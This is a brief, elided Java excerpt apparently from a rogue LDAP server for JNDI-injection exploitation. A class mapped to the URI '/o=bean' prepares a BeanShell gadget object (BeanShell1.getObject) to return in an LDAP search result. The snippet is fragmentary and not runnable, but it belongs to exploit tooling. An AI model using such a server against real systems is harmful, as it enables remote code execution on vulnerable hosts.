...
@LdapMapping(uri = { "/o=bean" })
public class BeanShell implements LdapController {
    ...
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        ...
        Method m = BeanShell1.class.getMethod("getObject", String.class);
        BeanShell1 myObj = new BeanShell1();
